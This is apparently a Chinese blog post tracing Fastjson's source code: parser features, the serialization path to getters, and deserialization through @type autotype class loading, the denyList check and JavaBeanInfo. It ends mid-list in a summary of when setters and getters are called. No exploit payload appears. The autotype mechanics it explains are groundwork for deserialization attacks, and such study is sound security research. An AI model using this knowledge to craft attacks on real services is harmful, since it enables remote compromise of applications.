<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Demo\&quot;,\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse Class = &quot;</span>+JSON.parse(serialize));</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject Class = &quot;</span>+JSON.parseObject(serialize).getClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(String,Class) Class = &quot;</span> +JSON.parseObject(serialize,Demo.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>想看一下为什么会调用setter、getter</p>
<h4 id="前置-Feature"><a href="#前置-Feature" class="headerlink" title="前置 Feature"></a>前置 Feature</h4><table>
<thead>
<tr>
<th>名字</th>
<th>作用</th>
<th>默认状态</th>
</tr>
</thead>
<tbody><tr>
<td>Feature.AutoCloseSource</td>
<td>决定解析器是否将自动关闭那些不属于parse自己的输入流。<strong>Parser close时⾃动关闭为创建Parser实例⽽创建的底层InputStream以及Reader等输⼊流</strong></td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowComment</td>
<td>决定parse是否解析Java/C++样式的注释</td>
<td>false</td>
</tr>
<tr>
<td>Feature.AllowUnQuotedFieldNames</td>
<td>决定parse是否允许使用非双引号属性名字</td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowSingleQuotes</td>
<td>决定parse是否允许单引号来包住属性名称和字符串值</td>
<td>true</td>
</tr>
<tr>
<td>Feature.InternFieldNames</td>
<td>决定JSON对象属性名称是否可以被<code>String#inter</code>规范化表示。intern：当调用intern方法时，如果已经包含等于此字符串，则返回该字符串，否则，将此对象添加到池中，并且返回此对象的引用。<strong>将json字段名作为字面量缓存起来，即fieldName.intern()</strong></td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowISO8601DateFormat</td>
<td>识别IOS8601格式的日期字符串，例如：2018-05-31T19：13：42.000Z</td>
<td>false</td>
</tr>
<tr>
<td>Feature.AllowArbitaryCommas</td>
<td>忽略json中包含的连续的多个逗号，非标准特性</td>
<td>false</td>
</tr>
<tr>
<td>Feature.UseBigDecimal</td>
<td>将json中的浮点数解析成BigDecimal对象，禁用后解析成Double对象</td>
<td>true</td>
</tr>
<tr>
<td>Feature.IgnoreNotMatch</td>
<td>解析式忽略未知的字段继续完成解析</td>
<td>true</td>
</tr>
<tr>
<td>Feature.SortFeidFastMatch</td>
<td>如果用fastjson序列化的文本，输出的结果时按照fieldName排序输出的，parse时也能利用这个顺序进行优化读取。这种情况下，parse能够获得非常好的性能</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableASM</td>
<td>禁用ASM</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableCircularReferenceDetect</td>
<td>禁用循环引用检测</td>
<td>false</td>
</tr>
<tr>
<td>Feature.InitStringFieldAsEmpty</td>
<td>对于没有值的字符串属性设置为空串</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportArrayToBean</td>
<td>允许将数组按照字段顺序解析成Java Bean</td>
<td>false</td>
</tr>
<tr>
<td>Feature.OrderedField</td>
<td>解析后属性保持原来的顺序</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableSpecialKeyDetect</td>
<td>禁用特殊字符检查</td>
<td>false</td>
</tr>
<tr>
<td>Feature.UseObjectArray</td>
<td>使用对象数组而不是集合</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportNonPublicField</td>
<td>使用解析没有setter方法的非public属性</td>
<td>false</td>
</tr>
<tr>
<td>Feature.IgnoreAutoType</td>
<td>禁用fastjson的AUTOTYPE特性，即不按照json字符串中的@type自动选择反序列化类</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableFieldSmartMatch</td>
<td>禁用属性智能匹配，例如下划线自动匹配驼峰</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportAutoType</td>
<td>启用fastjson的autotype功能，即根据json字符串中的@type自动选择反序列化的类</td>
<td>false</td>
</tr>
<tr>
<td>Feature.NonStringKeyAsString</td>
<td>解析时将为用引号包含的json字段名作为String类型存储，否则只能用原始类型获取key的值。。例如<code>String text=&quot;&#123;123:\&quot;abc\&quot;&#125;&quot;</code>在启⽤了NonStringKeyAsString后可以 通过<code>JSON.parseObject(text).getString(&quot;123&quot;)</code>的⽅式获取到”abc”，⽽在不启 ⽤NonStringKeyAsString时，<code>JSON.parseObject(text).getString(&quot;123&quot;)</code>只 能得到null，必须通过<code>JSON.parseObject(text).get(123)</code>的⽅式才能获取 到”abc”。</td>
<td>false</td>
</tr>
<tr>
<td>Feature.CustomMapDeserializer</td>
<td>自定义<code>&quot;&#123;\&quot;key\&quot;:vakue&#125;&quot;</code>解析成Map实例，否则解析为JSONObject</td>
<td>false</td>
</tr>
<tr>
<td>Feature.ErrorOnEnumNotMatch</td>
<td>枚举未匹配到时抛出异常，否则解析为null</td>
<td>false</td>
</tr>
</tbody></table>
<h4 id="序列化-1"><a href="#序列化-1" class="headerlink" title="序列化"></a>序列化</h4><p>利用<code>toJSONString(object)</code>的时候，依次调用三个<code>toJSONString</code>最后传入<code> JSONSerializer#write</code>对object进行JSON序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString(object, emptyFilters); </span><br><span class="line">    <span class="comment">//static final SerializeFilter[] emptyFilters = new SerializeFilter[0];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object, SerializeFilter[] filters, SerializerFeature... features)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString(object, SerializeConfig.globalInstance, filters, (String)<span class="keyword">null</span>, DEFAULT_GENERATE_FEATURE, features);</span><br><span class="line">    <span class="comment">// public static final SerializeConfig globalInstance = new SerializeConfig();</span></span><br><span class="line">    <span class="comment">// DEFAULT_GENERATE_FEATURE = features;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object, SerializeConfig config, SerializeFilter[] filters, String dateFormat, <span class="keyword">int</span> defaultFeatures, SerializerFeature... features)</span> </span>&#123;</span><br><span class="line">    SerializeWriter out = <span class="keyword">new</span> SerializeWriter((Writer)<span class="keyword">null</span>, defaultFeatures, features); <span class="comment">// 实例化</span></span><br><span class="line"></span><br><span class="line">    String var15;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JSONSerializer serializer = <span class="keyword">new</span> JSONSerializer(out, config); <span class="comment">// 实例化JSONSerializer out : &quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (dateFormat != <span class="keyword">null</span> &amp;&amp; dateFormat.length() != <span class="number">0</span>) &#123; <span class="comment">// null 不进入</span></span><br><span class="line">            serializer.setDateFormat(dateFormat);</span><br><span class="line">            serializer.config(SerializerFeature.WriteDateUseDateFormat, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (filters != <span class="keyword">null</span>) &#123; <span class="comment">// SerializeFilter</span></span><br><span class="line">            SerializeFilter[] var8 = filters;</span><br><span class="line">            <span class="keyword">int</span> var9 = filters.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var10 = <span class="number">0</span>; var10 &lt; var9; ++var10) &#123;</span><br><span class="line">                SerializeFilter filter = var8[var10];</span><br><span class="line">                serializer.addFilter(filter);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        serializer.write(object); <span class="comment">// JSONSerializer#write</span></span><br><span class="line">        var15 = out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>JSONSerializer#write</code>，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.out.writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass(); <span class="comment">// FastJson.Demon.Class</span></span><br><span class="line">        ObjectSerializer writer = <span class="keyword">this</span>.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writer.write(<span class="keyword">this</span>, object, (Object)<span class="keyword">null</span>, (Type)<span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(var5.getMessage(), var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.config.getObjectWriter(clazz); <span class="comment">// this.config = SerializeConfig</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>SerializeConfig#getObjectWriter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getObjectWriter(clazz, <span class="keyword">true</span>); <span class="comment">// Class FastJson.Demon</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里会判断我们传如的对象是什么对象，因为是我们自己创建的对象，所以会到最后的<code>create</code>才进去，调用put和<code>createJavaBeanSerializer</code>，之后便是获取传进去的类的filed，最后返回write（</p>
<p><img src="https://img-blog.csdnimg.cn/065cdfec5df7488383bf0ee03a3e0164.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz, <span class="keyword">boolean</span> create)</span> </span>&#123; <span class="comment">// Demo true</span></span><br><span class="line">    <span class="comment">// this.serializers = IdentityHashMao</span></span><br><span class="line">    ObjectSerializer writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz); </span><br><span class="line">    ClassLoader classLoader;</span><br><span class="line">    Iterator var5;</span><br><span class="line">    Object o;</span><br><span class="line">    AutowiredObjectSerializer autowired;</span><br><span class="line">    Iterator var8;</span><br><span class="line">    Type forType;</span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ……</span><br><span class="line"></span><br><span class="line">        writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">       ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            ……</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!TimeZone.class.isAssignableFrom(clazz) &amp;&amp; !Entry.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Appendable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                ……</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    String className = clazz.getName();</span><br><span class="line">                    ……</span><br><span class="line">                    <span class="keyword">if</span> (create) &#123; <span class="comment">// true</span></span><br><span class="line">                        <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)<span class="keyword">this</span>.createJavaBeanSerializer(clazz));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)CalendarCodec.instance);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.put((Type)clazz, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        writer = (ObjectSerializer)<span class="keyword">this</span>.serializers.get(clazz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> writer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>write为<code>ASMSerializer_1_Demo</code>，其父类为<code>JavaBeanSerializer</code>，所以总的来说会去调用<code>JavaBeanSerializer#write</code></p>
<p><img src="https://img-blog.csdnimg.cn/45210954cef844409edbca74437b48de.png" alt="img"></p>
<p>最后调用<code>ObjectSerializer#write</code>，之后实现调用getter，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.out.writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        ObjectSerializer writer = <span class="keyword">this</span>.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writer.write(<span class="keyword">this</span>, object, (Object)<span class="keyword">null</span>, (Type)<span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(var5.getMessage(), var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且在<code>SerializeWriter</code>将从getter中获取到的field，JSON序列化之后写入buf中</p>
<p><img src="https://img-blog.csdnimg.cn/6809e48d8c43428eb8f8d0f0195aec57.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h4><h5 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;FastJson.Demo&quot;,&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>先利用parse创建对象，创建了<code>DefaultJSONParser</code>对象，根据字符串开头为<code>&#123;</code>或者<code>[</code>给token赋值，并next下移判断字符    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">        Object value = parser.parse();</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DefaultJSONParser#parse</code>中创建了<code>JSONObject</code>对象，并在parseObject进行解析</p>
<p><img src="https://img-blog.csdnimg.cn/608e556c95f246cfb7aa1ba157d152f4.png" alt="img"></p>
<p>因为token已经变成12，直接进入else。利用死循环（300+行😭）对字符进行解析</p>
<p><code>skipWhitespace</code>，当字符为<code> |\r|\n|\t|\f|\b|</code>的时候不会解析或者当字符串为<code>/**/</code>注释的时候也不会解析。当<code>lexer.isEnabled(Feature.AllowArbitraryCommas)</code>成立的时候，连续的逗号也不会被解析</p>
<p><img src="https://img-blog.csdnimg.cn/ca13e25d6e6941d0b1bf019091b92c64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>JSONLexerBase#scanSymbol</code>把两个相邻的并且没用被<code>\</code>转义的quote之间的字符串截取出来。</p>
<p>就比如根据我前面传进去的，最先得到的是<code>@type</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">scanSymbol</span><span class="params">(SymbolTable symbolTable, <span class="keyword">char</span> quote)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.np = <span class="keyword">this</span>.bp;</span><br><span class="line">    <span class="keyword">this</span>.sp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> hasSpecial = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> chLocal = <span class="keyword">this</span>.next();</span><br><span class="line">        <span class="keyword">if</span> (chLocal == quote) &#123;  <span class="comment">// 如果前后字符相等</span></span><br><span class="line">            <span class="keyword">this</span>.token = <span class="number">4</span>;</span><br><span class="line">            String value;</span><br><span class="line">            <span class="keyword">if</span> (!hasSpecial) &#123; </span><br><span class="line">                <span class="keyword">int</span> offset;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.np == -<span class="number">1</span>) &#123;</span><br><span class="line">                    offset = <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    offset = <span class="keyword">this</span>.np + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                value = <span class="keyword">this</span>.addSymbol(offset, <span class="keyword">this</span>.sp, hash, symbolTable);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                value = symbolTable.addSymbol(<span class="keyword">this</span>.sbuf, <span class="number">0</span>, <span class="keyword">this</span>.sp, hash);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.sp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.next(); <span class="comment">// 继续取下一个字符</span></span><br><span class="line">            <span class="keyword">return</span> value; <span class="comment">// 返回两个quote之间的字符串</span></span><br><span class="line">        &#125;</span><br><span class="line">        ……</span><br><span class="line">        <span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">            ……</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            hash = <span class="number">31</span> * hash + chLocal;</span><br><span class="line">            <span class="keyword">if</span> (!hasSpecial) &#123;</span><br><span class="line">                ++<span class="keyword">this</span>.sp;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.sp == <span class="keyword">this</span>.sbuf.length) &#123;</span><br><span class="line">                <span class="keyword">this</span>.putChar(chLocal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.sbuf[<span class="keyword">this</span>.sp++] = chLocal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>SymbolTable#addSymbol</code>比较是否相等，返回字符串，这里返回的是<code>@type</code></p>
<p><img src="https://img-blog.csdnimg.cn/a2e739f61da747c1a49c57f21702c6c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>DefaultJSONParser#parseObject</code>，如果存在标识<code>@type</code>，且禁用了特殊字符检查，就会继续获取下一个<code>&quot;&quot;</code>之间的字符串（即我们的类名）并返回给<code>ref</code>，并利用<code>TypeUtils#loadClass</code>加载类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static String DEFAULT_TYPE_KEY = &quot;@type&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6874875a0b9e4f50a8a78745b6a6115b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>在<code>ParseConfig#getDesearilizer</code>中获取反序列化对象，并执行反序列化方法，而对对象也进行了黑名单过滤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    String deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;parser deny : &quot;</span> + className);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到<code>ParseConfig#createJavaBeanDesrializer</code>，其中创建了<code>JavaBeanDeserializer</code></p>
<p><img src="https://img-blog.csdnimg.cn/bc3f9debc3e049bd855b08ec489a76d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/bc0962421725486ea992d3c58d495150.png"></p>
<p>在<code>JavaBeanInfo#build</code>中获取<code>clazz</code>的属性、方法和构造器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; builderClass = getBuilderClass(jsonType);</span><br><span class="line">Field[] declaredFields = clazz.getDeclaredFields();</span><br><span class="line">Method[] methods = clazz.getMethods();</span><br><span class="line">Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == <span class="keyword">null</span> ? clazz : builderClass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (defaultConstructor != <span class="keyword">null</span>) &#123; <span class="comment">// 获得访问权限</span></span><br><span class="line">    TypeUtils.setAccessible(defaultConstructor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将符合条件的setter和getter添加进<code>fieldList</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123; <span class="comment">// 如果名字长度大于等于4 不是静态方法 返回值为空或者为其他类型</span></span><br><span class="line">    Class&lt;?&gt;[] types = method.getParameterTypes(); <span class="comment">// 参数类型</span></span><br><span class="line">    <span class="keyword">if</span> (types.length == <span class="number">1</span>) &#123; <span class="comment">// 参数个数为1</span></span><br><span class="line">        …… </span><br><span class="line">        <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// 如果方法以 set开始</span></span><br><span class="line">            ……</span><br><span class="line">                    <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                        propertyName = fieldAnnotation.name();</span><br><span class="line">                        add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="keyword">null</span>));</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">            ……</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line">            add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">    <span class="comment">// 方法名长度大于4 非静态方法 以get为开头  第四位字符大写 无参数 返回值类型为结合、布尔、整型或者长整型</span></span><br><span class="line">    JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">    <span class="keyword">if</span> (annotation == <span class="keyword">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">        ……</span><br><span class="line">        <span class="keyword">if</span> (fieldInfo == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, (Field)<span class="keyword">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, (JSONField)<span class="keyword">null</span>, (String)<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>build结束之后会实例化一个<code>JavaBeanInfo</code>。</p>
<p><code>ParseConfig#createJavaBeanDesrializer</code>在build之后调用了<code>ASMDeserializerFactory#createJavaBeanDesrializer</code>，在这里将字节码放入数组中，并通过<code>defineClass</code>和<code>Construct</code>创建一个反序列化类，并未每个属性创建<code>FieldDeserializer</code>，为之后的反序列化做准备</p>
<p><img src="https://img-blog.csdnimg.cn/0a30c03044884536b418ead3e972f7d4.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/415f69ae3eff45f5846f13bf55d61863.png" alt="img"></p>
<p>在<code>JavaBeanDeserializer#deserialize</code>中判断是否只有get，如果不是则直接调用了<code>fieldDeser.setValue</code>实则为<code>FieldDeserializer#setValue</code></p>
<p><img src="https://img-blog.csdnimg.cn/1fd2f20f5ca04b5186ed524b63e76e36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>实现调用setter</p>
<p><img src="https://img-blog.csdnimg.cn/90282958667f4dc383cc2148c64bc6bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><p>在分析<code>JSON.parse</code>的时候可以知道：</p>
<p>调用<code>setter</code>满足的条件：</p>
<ul>
<li>方法名长度大于4并且以set开始</li>
<li>不是静态方法</li>
<li>返回值为空或者当前类</li>
<li>参数个数为1</li>
</ul>
<p>调用<code>getter</code>满足的条件：</p>
<ul>
<li>方法名长度大于4且以get开始</li>
<li>不是静态方法</li>
<li>返回值为集合等</li>
